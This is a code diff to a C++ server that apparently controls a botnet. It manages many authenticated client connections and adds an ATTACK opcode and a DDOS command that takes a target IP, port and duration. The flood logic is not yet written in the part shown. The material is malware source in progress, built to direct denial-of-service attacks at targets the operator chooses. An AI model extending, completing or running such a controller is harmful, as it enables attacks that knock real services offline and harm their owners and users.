@@ -12,6 +12,7 @@
 #include <time.h>
 #include <string>
 #include <csignal>
+#include <vector>
 
 enum COMMAND {
 	HELP = 0x01,
@@ -28,6 +29,8 @@ void Disconnect(std::string ip);
 
 void SIGINTHandler(int signal);
 
+std::vector<std::string> split(std::string sData, char delimiter);
+
 COMMAND GetCommand(std::string cmd);
 
 std::string GenRandStr(int nLength);
@@ -40,6 +43,7 @@ std::mutex clientsMutex;
 #define MAXCONN 1200
 
 #define AUTH 0x01
+#define ATTACK 0x02
 #define DISCONNECT 0x10
 
 int main() {
@@ -89,6 +93,17 @@ int main() {
 			break;
 		case CLIENTS:
 			std::cout << "Connected clients: " << nClientCount << std::endl;
+			break;
+		case DDOS:
+			{
+				std::vector<std::string> splittedCmd = split(cmd, ' ');
+				std::string ip = splittedCmd[1];
+				std::string sPort = splittedCmd[2];
+				std::string sTime = splittedCmd[3];
+
+				int nPort = stoi(sPort);
+				int nTime = stoi(sTime);
+			}
 			break;
 		case CLEAR:
 			std::cout << "\033[2J\033[1;1H" << std::endl;
@@ -173,6 +188,7 @@ std::string GenRandStr(int nLength) {
 
 COMMAND GetCommand(std::string cmd) {
 	COMMAND command = UNKNOWN;
+	cmd = split(cmd, ' ')[0];
 	if (cmd == "help")
 		command = HELP;
 
@@ -212,7 +228,7 @@ void ClientThread(SOCKET sock, std::string ip) {
 			Disconnect(ip);
 
 		std::string respCode;
-		respCode.append(respBuff + 1, code.size());
+		respCode.append(&respBuff[1], code.size());
 
 		if (respCode != code)
 			Disconnect(ip);
@@ -240,6 +256,23 @@ void Disconnect(std::string ip) {
 	closesocket(sock);
 	clientsMutex.unlock();
 	return;
+}
+
+std::vector<std::string> split(std::string sData, char delimiter) {
+	std::vector<std::string> retStr;
+	std::string actualStr;
+	for (char c : sData) {
+		if (c != delimiter) 
+			actualStr += c;
+		else {
+			retStr.push_back(actualStr);
+			actualStr = "";
+		}
+	}
+	if (!actualStr.empty())
+		retStr.push_back(actualStr);
+
+	return retStr;
 }
 
 void SIGINTHandler(int signal) {
